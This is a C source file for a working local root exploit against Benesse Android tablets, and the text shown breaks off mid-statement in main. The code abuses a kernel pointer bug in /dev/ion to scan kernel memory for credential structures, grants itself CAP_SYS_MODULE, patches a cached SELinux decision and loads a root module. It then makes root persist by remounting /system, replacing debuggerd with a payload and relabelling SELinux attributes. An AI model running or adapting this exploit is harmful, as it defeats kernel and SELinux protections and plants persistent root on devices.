/* charepa.c - privilege transition for the Benesse tablets, driven from an app.
 *
 * Two facts shape this code.
 *
 *   /dev/ion is world-writable and ION_IOC_PHYS treats its argument as a kernel
 *   pointer: it reads *(u32*)arg as an fd and, if that fd is one of our
 *   dma-bufs, stores the buffer's IOVA at arg+4.  One call therefore tests a
 *   4-byte word and writes 4 bytes beside it.
 *
 *   An app cannot hold fd 10145: RLIMIT_NOFILE tops out at 4096.  So the BR2
 *   trick of using our own uid as the alphabet does not port.  The value every
 *   unprivileged cred carries regardless of uid is cap_bset.cap[0] = 0xc0 = 192,
 *   which does fit in the fd table.
 *
 * Flow, all in one process:
 *   1. open /dev/ion, raise the fd limit, keep one dma-buf with IOVA 0x80010000
 *   2. walk the linear map for cred slots whose cap_bset is 192, grant
 *      CAP_SYS_MODULE into cap_effective, and ask the kernel whether ours took
 *   3. that attempt makes SELinux cache an avc_node with tclass=4; walk again
 *      and set bit 16 in its av_decision.allowed
 *   4. load the module, then install a boot hook so root survives a reboot
 *
 * Usage:
 *   charepa validate      prove the 4-byte write primitive, touching nothing
 *   charepa all [lo hi [window budget]]   run the whole chain
 *
 * `all` ends with root and a boot hook that restores it after a reboot. The
 * module and the payload are picked up from the directory this binary lives in,
 * falling back to /data/local/tmp.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <sys/mount.h>
#include <linux/fs.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };
struct ion_handle_data { s32 handle; };

#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_FREE   _IOWR(ION_TYPE, 1, struct ion_handle_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)

#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART      0x01000000ULL

/* The linear-map window is derived from /proc/iomem at run time rather than
 * assumed. Measured on BS: "System RAM 01000000-7fffffff", "Kernel code
 * 01080000-01a78c13". A model whose RAM ends somewhere else would be scanned
 * past its end without this, and every probe beyond the end is a wasted store. */
static void say(const char *fmt, ...);   /* defined below, used by read_iomem */
static u32 g_ram_lo = 0x01000000u, g_ram_hi = 0x7f000000u;

static void read_iomem(void)
{
    FILE *f = fopen("/proc/iomem", "r");
    if (!f) { say("iomem unreadable errno=%d, using defaults\n", errno); return; }
    char l[256];
    while (fgets(l, sizeof l, f)) {
        if (!strstr(l, "System RAM")) continue;
        unsigned long a = 0, b = 0;
        if (sscanf(l, " %lx-%lx", &a, &b) == 2 && b > a) {
            g_ram_lo = (u32)a;
            g_ram_hi = (u32)b;
            say("iomem: System RAM 0x%08x..0x%08x\n", g_ram_lo, g_ram_hi);
            break;
        }
    }
    fclose(f);
}
#define PGSZ          4096
#define CRED_STEP     192
#define CRED_SLOTS    21
#define ALPHABET      192u        /* cap_bset.cap[0] of any unprivileged cred */
#define CAP_SYS_MODULE_BIT 16
#define ALPHA_FD      192
#define CLASS_FD      4
#define ION_SLOT      3000
#define MODULE_PATH   "/data/local/tmp/myroot.ko"

struct cap_hdr { u32 version; s32 pid; };
struct cap_data { u32 eff, prm, inh; };

static FILE *LOG;
static FILE *g_FILELOG;
static int ionfd = -1;

/* Measured on TAB-A03-BS: the ION sweep writes the carrier's IOVA into whatever
 * word it matches, and one of those words belonged to the page cache of
 * /data/local/tmp/myroot.ko. The file's hash moved from
 *   507ebb47b1517389f676524fffa0cb1cb1c22d976176b590153c8966e37307aa
 * to ddfddab66d6ee65912ba295c5ce581ca3137d1d38574419c9b8b4e48ae269da2
 * with 0x00018000 replaced by 0x80010000, the carrier IOVA. init_module then
 * returned ENOEXEC for a file that loads fine from the init domain, and the
 * pulled copy differed from the host copy in exactly five bytes.
 *
 * So every file the chain needs is read into memory before the sweep begins and
 * used from there. Nothing is opened after kernel memory has been written. */
static char *g_ko_buf; static long g_ko_len;
static char *g_pl_buf; static long g_pl_len;

static void say(const char *fmt, ...)
{
    char b[256]; va_list ap; va_start(ap, fmt);
    vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
    /* A run that stores into the wrong place reboots the tablet before the
     * process can flush anything more, and the sweep can reach hundreds of
     * megabytes. Mirroring each line to a file on /data means the geometry of
     * a missed attempt survives the reboot, which is what makes the window
     * tunable instead of guesswork. */
    if (g_FILELOG) { fputs(b, g_FILELOG); fflush(g_FILELOG); }
}

static int gate(u64 a)
{
    struct ion_custom_data cd;
    cd.cmd = ION_IOC_PHYS;
    cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}

static u32 eff_of(int pid)
{
    struct cap_hdr hh; struct cap_data dd[2];
    memset(&hh, 0, sizeof hh); memset(dd, 0, sizeof dd);
    hh.version = 0x20080522; hh.pid = pid;
    if (syscall(SYS_capget, &hh, dd) < 0) return 0xFFFFFFFFu;
    return dd[0].eff;
}

/* -ENOEXEC (8) means the capability check passed and the image was rejected */
static int probe_module(void)
{
    static const char junk[4] = { 0x7f, 'E', 'L', 'F' };
    errno = 0;
    syscall(105, junk, 4UL, "");
    return errno;
}

static int mk_buf(int *out_fd, u32 *out_iova)
{
    struct ion_allocation_data a; memset(&a, 0, sizeof a);
    a.len = PGSZ; a.heap_id_mask = 1u << 0; a.flags = 1;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;

    struct ion_fd_data d; memset(&d, 0, sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;

    struct ion_phys_data p; memset(&p, 0, sizeof p);
    p.fd = d.fd; p.flags = 2;
    if (ioctl(ionfd, ION_IOC_PHYS, &p) < 0) return 0;

    *out_fd = d.fd; *out_iova = p.addr;
    return 1;
}

static int quiet_zero_on_stdin(void)
{
    int n = open("/dev/null", O_RDONLY);
    if (n < 0) return -1;
    dup2(n, 0);
    return n;
}

/* -------------------------------------------------------------------------
 * validate: the gate must reject a zero word and accept the alphabet, using
 * pages we own.  Nothing here touches kernel memory.
 * ------------------------------------------------------------------------- */
static int cmd_info(void)
{
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) { say("status unreadable errno=%d\n", errno); return 1; }
    char line[256];
    while (fgets(line, sizeof line, f))
        if (!strncmp(line, "Cap", 3) || !strncmp(line, "Uid:", 4) || !strncmp(line, "Gid:", 4))
            say("  %s", line);
    fclose(f);
    { int n = open("/dev/null", O_RDONLY); say("  lowest free fd = %d\n", n); close(n); }
    say("  uid=%d euid=%d gid=%d\n", getuid(), geteuid(), getgid());
    return 0;
}

static int cmd_validate(void)
{
    u8 *pg = mmap(NULL, 3 * PGSZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (pg == MAP_FAILED) { say("mmap errno=%d\n", errno); return 1; }

    int dfd; u32 iova;
    if (!mk_buf(&dfd, &iova)) { say("buffer errno=%d\n", errno); return 1; }
    say("dma-buf fd=%d iova=0x%08x\n", dfd, iova);
    if (dup2(dfd, ALPHA_FD) < 0) { say("dup2 errno=%d\n", errno); return 1; }
    close(dfd);

    *(u32 *)(pg + 0) = 0;
    errno = 0;
    int r_zero = gate((u64)(uintptr_t)pg);
    say("gate(word=0)   rc=%d errno=%d  want -1\n", r_zero, errno);

    *(u32 *)(pg + PGSZ) = ALPHABET;
    *(u32 *)(pg + PGSZ + 4) = 0xdeadbeef;
    errno = 0;
    int r_alpha = gate((u64)(uintptr_t)(pg + PGSZ));
    say("gate(word=192) rc=%d errno=%d  want 0\n", r_alpha, errno);
    u32 after = *(u32 *)(pg + PGSZ + 4);
    say("word at +4: 0x%08x (want 0x%08x)\n", after, iova);

    int ok = (r_zero == -1 && r_alpha == 0 && after == iova);
    say("VALIDATE %s\n", ok ? "PASS" : "FAIL");
    return ok ? 0 : 1;
}

/* -------------------------------------------------------------------------
 * phase 1: find a cred slot carrying the alphabet and grant CAP_SYS_MODULE.
 * ------------------------------------------------------------------------- */
static u64 find_cred(u32 lo, u32 hi, int page_window, long find_budget)
{
    static int hold[512]; int nhold = 0;
    int carrier = -1, carrier_iova = 0;

    while (nhold < 512) {
        int f; u32 iv;
        if (!mk_buf(&f, &iv)) break;
        if (iv & (1u << CAP_SYS_MODULE_BIT)) { carrier = f; carrier_iova = (int)iv; break; }
        hold[nhold++] = f;
    }
    if (carrier < 0) { say("no buffer with bit 16 after %d allocations\n", nhold); return 0; }
    for (int i = 0; i < nhold; i++) close(hold[i]);
    if (dup2(carrier, ALPHA_FD) < 0) { say("dup2(%d) errno=%d\n", ALPHA_FD, errno); return 0; }
    close(carrier);
    say("carrier fd=%d iova=0x%08x. alphabet is one value.\n", ALPHA_FD, carrier_iova);

    int nul = quiet_zero_on_stdin();
    if (nul >= 0) say("fd 0 is /dev/null; zero words will not match\n");

    long probes = 0, hits = 0, granted = 0, find_stores = 0;
    /* Each hit writes 4 bytes into cap_bset.cap[1], which is zero and stays
     * zero, so the budget only exists to bound a runaway sweep. Measured hits
     * reach ~660 over the whole map, hence the generous ceiling. */
    u64 cred = 0;
    static u64 cand[4096];

    for (u32 base = lo; base < hi && !cred; base += (u32)page_window * PGSZ) {
        u32 top = base + (u32)page_window * PGSZ;
        if (top > hi) top = hi;
        int nc = 0;

        for (u32 p = base; p < top; p += PGSZ) {
            u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
            for (int s = 0; s < CRED_SLOTS; s++) {
                u64 o = pg + (u64)s * CRED_STEP;
                if ((size_t)s * CRED_STEP + 132 >= PGSZ) break;
                probes++;
                if (gate(o + 64) != 0) continue;     /* not 192 */
                hits++;
                find_stores++;
                /* the other cred words that should be zero must reject too */
                if (gate(o + 68) == 0) continue;     /* cap_bset.cap[1] */
                if (gate(o + 56) == 0) continue;     /* cap_effective.cap[0] */
                if (gate(o + 48) == 0) continue;     /* cap_permitted.cap[0] */
                if (gate(o + 40) == 0) continue;     /* cap_inheritable.cap[0] */
                if (gate(o + 4)  == 0) continue;     /* uid 0 belongs to root, not us */
                if (find_stores > find_budget) {
                    say("cred budget spent (%ld); stopping this window\n", find_stores);
                    return 0;
                }
                if (nc < 4096) cand[nc++] = o;
            }
        }
        say("  cred window 0x%08x..0x%08x probes=%ld hits=%ld cand=%d\n",
            base, top, probes, hits, nc);

        for (int i = 0; i < nc && !cred; i++) {
            u64 o = cand[i];
            if (dup2(ALPHA_FD, 0) < 0) break;
            if (gate(o + 52) == 0) {                 /* writes at o+56 */
                granted++;
                u32 e = eff_of(0);
                if (e != 0xFFFFFFFFu && (e & (1u << CAP_SYS_MODULE_BIT))) cred = o;
            }
            quiet_zero_on_stdin();
        }
    }
    if (nul >= 0) { quiet_zero_on_stdin(); }
    say("cred scan probes=%ld hits=%ld granted=%ld cred=0x%llx\n",
        probes, hits, granted, (unsigned long long)cred);
    return cred;
}

/* -------------------------------------------------------------------------
 * phase 2: the avc_node that caches the denied CAP_SYS_MODULE.
 *
 * Node layout:
 *
 *   +0  ssid (u32)   +4  tsid (u32)   +8  tclass (u16, then padding)
 *   +12 av_decision.allowed
 *
 * The gate passes when a word equals one of our dma-buf fd numbers AND writes
 * the buffer's IOVA at +4. So a "filter" is never free for the word it passes:
 * testing X costs a store at X+4. Two consequences shape this code.
 *
 *   Only fd 4 holds a buffer, so a pass means the word is exactly 4, the
 *   capability class. Holding a wider alphabet looks better but is wrong: a
 *   pass would then mean "some number in 4..4090", and storing into the +12 of
 *   whatever struct that was killed the tablet within a second.
 *
 *   The rejects at +0 and +4 are useful anyway: they turn most candidates into
 *   a pass-free miss, so the sweep costs one ioctl each and writes only where
 *   the class word really is 4.
 *
 * The node sits in the avc_node kmem_cache, allocated at the moment we first
 * try init_module, so it is near the cred slab. Measured window: 810 stores
 * inside 64 MB around the cred.
 * ------------------------------------------------------------------------- */
static int grant_avc(u32 lo, u32 hi, int page_window, long max_stores, u64 cred)
{
    if (!lo || !hi) {
        u32 cp = (u32)(cred - PAGE_OFFSET_V + MEMSTART);
        /* Measured twice on TAB-A03-BS. The attempt that won reported
         *
         *   cred phys 0x39521cc0, AVC win phys 0x355d9cc0
         *
         * i.e. the node sat 0x3F50000 (63.3 MB) BELOW the cred, and the
         * winning store was the first probe of the window. A narrower band
         * around cred-24MB never reached it, so the window has to stay at 64
         * MB below and a little above. */
        lo = (cp >= 0x04000000u) ? cp - 0x04000000u : 0x02000000u;
        hi = cp + 0x01000000u;
        if (hi > 0x7f000000u) hi = 0x7f000000u;
    }
    say("avc search 0x%08x..0x%08x (cred phys 0x%08x)\n", lo, hi,
        (u32)(cred - PAGE_OFFSET_V + MEMSTART));

    close(ALPHA_FD);
    quiet_zero_on_stdin();

    static int tmp[256]; int ntmp = 0; int cls = -1; u32 iv = 0;
    while (ntmp < 256) {
        int f; u32 v;
        if (!mk_buf(&f, &v)) break;
        if ((v >> 16) & 1) { cls = f; iv = v; break; }
        tmp[ntmp++] = f;
    }
    if (cls < 0) { say("no buffer with bit 16 for fd 4\n"); return 0; }
    for (int i = 0; i < ntmp; i++) close(tmp[i]);
    if (dup2(cls, CLASS_FD) < 0) { say("dup2(4) errno=%d\n", errno); close(cls); return 0; }
    close(cls);
    say("class fd=%d iova=0x%08x; only the word 4 passes now\n", CLASS_FD, (int)iv);

    long probes = 0, stores = 0;
    int won = 0;
    for (u32 base = lo; base < hi && !won; base += (u32)page_window * PGSZ) {
        u32 t = base + (u32)page_window * PGSZ;
        if (t > hi) t = hi;
        for (u32 p = base; p < t && !won; p += PGSZ) {
            u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
            for (int i = 0; i < PGSZ / 64; i++) {
                u64 n = pg + (u64)i * 64;
                probes++;
                if (gate(n + 0) == 0) continue;
                if (gate(n + 4) == 0) continue;
                if (gate(n + 8) != 0) continue;
                stores++;
                say("  store phys 0x%08x off %d (probe %ld)\n", p, i * 64, probes);
                if (probe_module() == 8) {
                    say("AVC win phys=0x%08x off=%d probes=%ld stores=%ld\n",
                        p, i * 64, probes, stores);
                    won = 1;
                    break;
                }
                if (stores >= max_stores) {
                    say("AVC budget spent (%ld stores); stopping this attempt\n", stores);
                    break;
                }
            }
            if (stores >= max_stores) break;
        }
        say("  avc 0x%08x..0x%08x probes=%ld stores=%ld\n", base, t, probes, stores);
        if (stores >= max_stores) break;
    }
    if (!won) say("AVC no win probes=%ld stores=%ld\n", probes, stores);
    return won;
}

/* -------------------------------------------------------------------------
 * phase 3: load the module and make it survive a reboot.
 * ------------------------------------------------------------------------- */
/* companion(name): the file next to this binary first, /data/local/tmp second.
 * The APK stages all three files into files/bin, so "next to me" is the normal
 * case; the tmp fallback keeps the manual adb workflow working. */
static const char *companion(const char *name)
{
    static char found[512];
    char exe[512] = {0};
    ssize_t r = readlink("/proc/self/exe", exe, sizeof exe - 1);
    if (r > 0) {
        exe[r] = 0;
        char *slash = strrchr(exe, '/');
        if (slash) {
            *slash = 0;
            snprintf(found, sizeof found, "%s/%s", exe, name);
            if (access(found, R_OK) == 0) return found;
        }
    }
    snprintf(found, sizeof found, "/data/local/tmp/%s", name);
    if (access(found, R_OK) == 0) return found;
    return NULL;
}

/* read a companion file into memory while the process can still trust the
 * page cache */
static long slurp(const char *path, char **out);
static long preload_file(const char *name, char **out)
{
    const char *path = companion(name);
    if (!path) { say("preload: %s not found\n", name); return -1; }
    char *b = NULL;
    long n = slurp(path, &b);
    if (n <= 0) { say("preload: %s unreadable (errno=%d)\n", path, errno); return -1; }
    *out = b;
    say("preload: %s %ld bytes from %s\n", name, n, path);
    return n;
}

static void preload_chain(void)
{
    g_ko_len = preload_file("myroot.ko", &g_ko_buf);
    g_pl_len = preload_file("bootpayload", &g_pl_buf);
}

static long load_module(void)
{
    if (g_ko_len <= 0 || !g_ko_buf) { say("module was not preloaded\n"); return -1; }
    errno = 0;
    long rc = syscall(105, g_ko_buf, (unsigned long)g_ko_len, "");
    say("init_module rc=%ld errno=%d (%ld bytes)\n", rc, errno, g_ko_len);
    /* EEXIST (17) means this module is already in the kernel, which is the
     * situation after the boot hook has done its job. That is not a failure. */
    if (rc != 0 && errno == 17) { say("module already loaded\n"); return 0; }
    return rc;
}

/* -------------------------------------------------------------------------
 * survey: with root, read the files that decide where a boot hook can go.
 *
 * /init.rc imports /init.${ro.hardware}.rc, and the hardware rc may or may not
 * import the tel rc that execs mrdloader. Rather than guess, print the imports
 * and every exec line that starts a /system program.
 * ------------------------------------------------------------------------- */
static void survey_boot(void)
{
    static const char *files[] = {
        "/init.rc", "/init.pxa1928.rc", "/init.tel.rc", "/init.pxa1928.tel.rc",
        "/init.environ.rc", "/init.usb.rc", "/init.zygote64_32.rc",
        "/init.trace.rc", "/init.pxa1928.usb.rc", NULL
    };
    for (int i = 0; files[i]; i++) {
        FILE *f = fopen(files[i], "r");
        if (!f) { say("survey: %s unreadable (errno=%d)\n", files[i], errno); continue; }
        say("survey: %s\n", files[i]);
        char line[512];
        while (fgets(line, sizeof line, f)) {
            if (strstr(line, "import ") || strstr(line, "exec /system") ||
                strstr(line, "mrdloader"))
                say("   %s", line);
        }
        fclose(f);
    }
}

/* -------------------------------------------------------------------------
 * phase 4: make root survive a reboot.
 *
 * init execs /system/bin/mrdloader from `on post-fs-data` with no seclabel,
 * and the file carries u:object_r:system_file:s0, so the child stays in the
 * init domain. Replacing that path with a static binary therefore gives us a
 * program that runs at every boot, as init, with no SELinux restrictions.
 *
 * A shell script would not work: the kernel would have to exec /system/bin/sh,
 * and init's domain is denied shell_exec. That is why the payload is static.
 *
 * The original mrdloader is kept as mrdloader.real and the payload execs it, so
 * the device still does whatever it did before.
 * ------------------------------------------------------------------------- */
static int be_root(void)
{
    int f = open("/proc/myroot", O_WRONLY);
    if (f < 0) return -1;
    ssize_t w = write(f, "1", 1);
    close(f);
    return w == 1 ? 0 : -1;
}

static long slurp(const char *path, char **out)
{
    int f = open(path, O_RDONLY);
    if (f < 0) return -1;
    struct stat st;
    if (fstat(f, &st) != 0 || st.st_size <= 0) { close(f); return -1; }
    char *b = malloc(st.st_size);
    ssize_t n = read(f, b, st.st_size);
    close(f);
    if (n <= 0) { free(b); return -1; }
    *out = b;
    return (long)n;
}

static int put(const char *dst, const char *src, mode_t mode)
{
    char *b = NULL;
    long n = slurp(src, &b);
    if (n < 0) { say("  read %s failed (errno=%d)\n", src, errno); return -1; }

    /* Writing straight into an executable that is currently running fails with
     * ETXTBSY. Build the new file beside it and rename over the old entry: the
     * running process keeps working from its inode, and the next exec picks up
     * the new file. */
    char tmp[512];
    snprintf(tmp, sizeof tmp, "%s.new", dst);
    int f = open(tmp, O_CREAT | O_TRUNC | O_WRONLY, mode);
    if (f < 0) { say("  create %s: %s\n", tmp, strerror(errno)); free(b); return -1; }
    ssize_t w = write(f, b, n);
    close(f);
    chmod(tmp, mode);
    free(b);
    if (w != (ssize_t)n) { say("  short write %s (%zd/%ld)\n", tmp, w, n); unlink(tmp); return -1; }
    if (rename(tmp, dst) != 0) { say("  rename %s: %s\n", dst, strerror(errno)); unlink(tmp); return -1; }
    say("  %s <- %s (%ld bytes)\n", dst, src, n);
    return 0;
}

/* put_buf is put() for a buffer that is already in memory: after the sweep there
 * is no file to read from that can be trusted, and reading one could fault on a
 * corrupted page cache entry. */
static int put_buf(const char *dst, const char *b, long n, mode_t mode)
{
    char tmp[512];
    snprintf(tmp, sizeof tmp, "%s.new", dst);
    int f = open(tmp, O_CREAT | O_TRUNC | O_WRONLY, mode);
    if (f < 0) { say("  create %s: %s\n", tmp, strerror(errno)); return -1; }
    ssize_t w = write(f, b, n);
    close(f);
    chmod(tmp, mode);
    if (w != (ssize_t)n) { say("  short write %s (%zd/%ld)\n", tmp, w, n); unlink(tmp); return -1; }
    if (rename(tmp, dst) != 0) { say("  rename %s: %s\n", dst, strerror(errno)); unlink(tmp); return -1; }
    say("  %s <- buffer (%ld bytes)\n", dst, n);
    return 0;
}

/* -------------------------------------------------------------------------
 * set_selinux_label: change a file's security.selinux xattr directly.
 *
 * Why this is the whole trick: init picks a service's domain from the label of
 * the file it executes, not from the service stanza. A file whose label has no
 * exec type, like /system/bin/mrdloader with system_file:s0, runs in init's own
 * domain. There is a type transition table entry for kinitlog_exec (which is
 * why kinitlog.sh runs as u:r:kinitlog:s0 and is refused everything), so
 * relabelling the script is what lifts the restriction.
 *
 * chcon cannot be used: /system/bin/chcon runs through toolbox, which fails to
 * link on this device. setxattr(2) is a direct syscall with no dependency.
 * ------------------------------------------------------------------------- */
static int set_selinux_label(const char *path, const char *label)
{
    int rc = setxattr(path, "security.selinux", label, strlen(label), 0);
    if (rc != 0) { say("hook: setxattr %s: errno=%d (%s)\n", path, errno, strerror(errno)); return -1; }
    say("hook: %s relabelled to %s\n", path, label);
    return 0;
}

/* Which file to replace, and why.
 *
 * A service's domain comes from the label of the file init executes, not from
 * the stanza. Every daemon on /system carries an *_exec type, so its child is
 * transitioned into a restricted domain. Setting security.selinux to
 * system_file:s0 removes that transition and the child stays in init's own
 * domain, which is the one domain SELinux does not restrict here.
 *
 * The service must also actually start. Measured on BS:
 *   kinitlog            waits for sys.boot_completed=1, and that property is
 *                       never set on this device, so it never runs.
 *   flash_recovery      never started at all.
 *   mrdloader exec      lives in /init.tel.rc, which nothing imports.
 *
 * debuggerd is started by class_start main at every boot and runs as root.
 * Its usual job is handling crashes, so a failure here cannot stop the device
 * from booting. The payload execs the real binary immediately afterwards, so
 * the daemon is transparent once our work is done.
 */
#define HOOK_PATH  "/system/bin/debuggerd"
#define HOOK_REAL  "/system/bin/debuggerd.real"

static int be_root(void);

/* The label repair has to be reachable from the already-rooted path too.
 *
 * install_hook only runs on a unit that is not yet rooted, and it is
 * idempotent about the saved copy: once debuggerd.real exists it is left
 * alone. So a unit hooked by an older build keeps its wrong label even after
 * this one runs. Measured: stripping the label back to system_file and then
 * running `all` on a rooted unit re-rooted fine but left debuggerd.real as
 * u:object_r:system_file:s0, because the short path returns before the hook
 * code. This function is what those units run instead. */
static void ensure_real_label(void)
{
    if (access(HOOK_REAL, F_OK) != 0) return;
    { char cur[128] = {0};
      if (getxattr(HOOK_REAL, "security.selinux", cur, sizeof cur - 1) > 0) {
          if (strstr(cur, "debuggerd_exec")) { say("label: %s already correct\n", HOOK_REAL); return; }
          say("label: %s carries %s; fixing\n", HOOK_REAL, cur);
      } }

    static const char *blocks[] = {
        "/dev/block/platform/soc.1/by-name/system",
        "/dev/block/by-name/system",
        NULL
    };
    int blk = -1;
    for (int i = 0; blocks[i]; i++) {
        blk = open(blocks[i], O_RDWR);
        if (blk >= 0) break;
    }
    if (blk < 0) { say("label: no system block device (errno=%d)\n", errno); return; }
    ioctl(blk, BLKROSET, &(int){0});
    if (mount(NULL, "/system", NULL, MS_REMOUNT, NULL) != 0) {
        say("label: remount rw failed: %s\n", strerror(errno));
        close(blk);
        return;
    }
    set_selinux_label(HOOK_REAL, "u:object_r:debuggerd_exec:s0");
    sync();
    ioctl(blk, BLKROSET, &(int){1});
    mount(NULL, "/system", NULL, MS_REMOUNT | MS_RDONLY, NULL);
    close(blk);
}

static int install_hook(void)
{
    if (g_pl_len <= 0 || !g_pl_buf) { say("hook: payload was not preloaded\n"); return 0; }
    if (be_root() != 0) { say("hook: no root\n"); return 0; }

    /* The by-name path differs between the two models: measured, BS has
     * /dev/block/platform/soc.1/by-name and no /dev/block/by-name. Try both,
     * because the APK has to serve either unit without a flag. */
    static const char *blocks[] = {
        "/dev/block/platform/soc.1/by-name/system",
        "/dev/block/platform/*/by-name/system",          /* glob is not used below */
        "/dev/block/by-name/system",
        NULL
    };
    int blk = -1; const char *used = NULL;
    for (int i = 0; blocks[i]; i++) {
        if (blocks[i][0] == '/' && strstr(blocks[i], "*")) continue;
        blk = open(blocks[i], O_RDWR);
        if (blk >= 0) { used = blocks[i]; break; }
    }
    if (blk < 0) { say("hook: no system block device (errno=%d)\n", errno); return 0; }
    say("hook: block=%s\n", used);
    ioctl(blk, BLKROSET, &(int){0});
    if (mount(NULL, "/system", NULL, MS_REMOUNT, NULL) != 0) {
        say("hook: remount rw: %s\n", strerror(errno));
        close(blk);
        return 0;
    }
    say("hook: /system is rw\n");

    mkdir("/system/lib/modules", 0755);
    if (g_ko_len > 0) put_buf("/system/lib/modules/myroot.ko", g_ko_buf, g_ko_len, 0644);
    else say("hook: module missing, cannot persist\n");

    if (access(HOOK_REAL, F_OK) != 0) {
        if (put(HOOK_REAL, HOOK_PATH, 0755) != 0) {
            say("hook: cannot save the original; aborting to avoid losing it\n");
            ioctl(blk, BLKROSET, &(int){1});
            mount(NULL, "/system", NULL, MS_REMOUNT | MS_RDONLY, NULL);
            close(blk);
            return 0;
        }
        /* Measured: without this the copy keeps the payload's label, so when
         * the payload forks and execs it the kernel logs
         *   avc: denied { execute_no_trans } path="/system/bin/debuggerd.real"
         *   scontext=u:r:kernel:s0 tcontext=u:object_r:system_file:s0
         * and the real daemon starts outside debuggerd's domain. It then never
         * picks up crash reports: SIGSEGV was raised and logged by libc, but no
         * tombstone was written. Giving the copy the original exec type puts
         * the daemon back where init expects it. */
        set_selinux_label(HOOK_REAL, "u:object_r:debuggerd_exec:s0");
    }
    if (put_buf(HOOK_PATH, g_pl_buf, g_pl_len, 0755) != 0) {
        say("hook: payload copy FAILED; leaving the original in place\n");
        ioctl(blk, BLKROSET, &(int){1});
        mount(NULL, "/system", NULL, MS_REMOUNT | MS_RDONLY, NULL);
        close(blk);
        return 0;
    }
    set_selinux_label(HOOK_PATH, "u:object_r:system_file:s0");

    { struct stat st;
      const char *c[] = { "/system/lib/modules/myroot.ko", HOOK_PATH, HOOK_REAL, NULL };
      for (int i = 0; c[i]; i++)
          if (stat(c[i], &st) == 0)
              say("hook: %-38s %lld bytes\n", c[i], (long long)st.st_size);
          else
              say("hook: %-38s MISSING\n", c[i]); }

    sync();
    ioctl(blk, BLKROSET, &(int){1});
    mount(NULL, "/system", NULL, MS_REMOUNT | MS_RDONLY, NULL);
    say("hook: /system back to ro\n");
    close(blk);
    return 1;
}

int main(int argc, char **argv)
{
    LOG = stdout; setbuf(LOG, NULL);
    /* /data/local/tmp is writable by the shell context, which is where the
     * first-root run happens; an app process cannot create it there, so the
     * mirror is skipped when the open fails. */
    g_FILELOG = fopen("/data/local/tmp/charepa_try.log", "w");
    if (g_FILELOG) setbuf(g_FILELOG, NULL);
    say("charepa pid=%d uid=%d\n", getpid(), getuid());
    {   /* the alphabet comes from this process's own cap_bset */
        FILE *st = fopen("/proc/self/status", "r");
        if (st) {
            char l[256];
            while (fgets(l, sizeof l, st))
                if (!strncmp(l, "CapBnd:", 7)) say("  %s", l);
            fclose(st);
        }
    }

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
        getrlimit(RLIMIT_NOFILE, &rl);
        say("fds soft=%lu hard=%lu\n", (unsigned long)rl.rlim_cur, (unsigned long)rl.rlim_max);
    }
    if (rl.rlim_cur <= ALPHA_FD) { say("cannot hold fd %d\n", ALPHA_FD); return 1; }

    int raw = open("/dev/ion", O_RDWR);
    if (raw < 0) { say("open(/dev/ion) errno=%d (%s)\n", errno, strerror(errno)); return 1; }
    ionfd = fcntl(raw, F_DUPFD, ION_SLOT);
    if (ionfd < 0) ionfd = raw; else close(raw);
    say("ion fd=%d\n", ionfd);

    preload_chain();
    read_iomem();

    if (argc >= 2 && !strcmp(argv[1], "validate")) return cmd_validate();
    if (argc >= 2 && !strcmp(argv[1], "info")) return cmd_info();

    /* A unit that has already been rooted has /proc/myroot, and the module is
     * loaded at boot by the hook. There is then nothing to sweep: one byte
     * through /proc/myroot replaces this process's credential with one cloned
     * from init_cred, which is all that "root" means here. Measured: the app's
     * own process carries CapBnd = 0, so the alphabet used by find_cred is
     * absent and every sweep ends with "RESULT no cred"; the path below is what
     * makes the app usable on a device that was rooted once. */
    { int p = open("/proc/myroot", O_WRONLY);
      if (p >= 0) {
          ssize_t w = write(p, "1", 1);
          close(p);
          if (w == 1) {
              say("already rooted: /proc/myroot accepted a write\n");
              say("uid=%d euid=%d capget=0x%08x\n", getuid(), geteuid(), eff_of(0));
              /* a unit hooked by an older build still needs this */
              ensure_real_label();
              say("RESULT ROOT uid=%d (via /proc/myroot)\n", getuid());
              return getuid() == 0 ? 0 : 1;
          }
      } }

    u32 lo = g_ram_lo, hi = g_ram_hi;
    int window = 2048; long budget = 2600; u32 avclo = 0, avchi = 0;
    if (argc >= 4) { lo = (u32)strtoul(argv[2], NULL, 16); hi = (u32)strtoul(argv[3], NULL, 16); }
    if (argc >= 5) window = atoi(argv[4]);
    if (argc >= 6) budget = atol(argv[5]);
    if (argc >= 8) { avclo = (u32)strtoul(argv[6], NULL, 16); avchi = (u32)strtoul(argv[7], NULL, 16); }

    say("this writes on every match; the tablet may reboot\n");
    u64 cred = find_cred(lo, hi, window, 20000);
    if (!cred) { say("RESULT no cred\n"); return 1; }
    say("cred=0x%llx eff=0x%08x module_errno=%d\n",
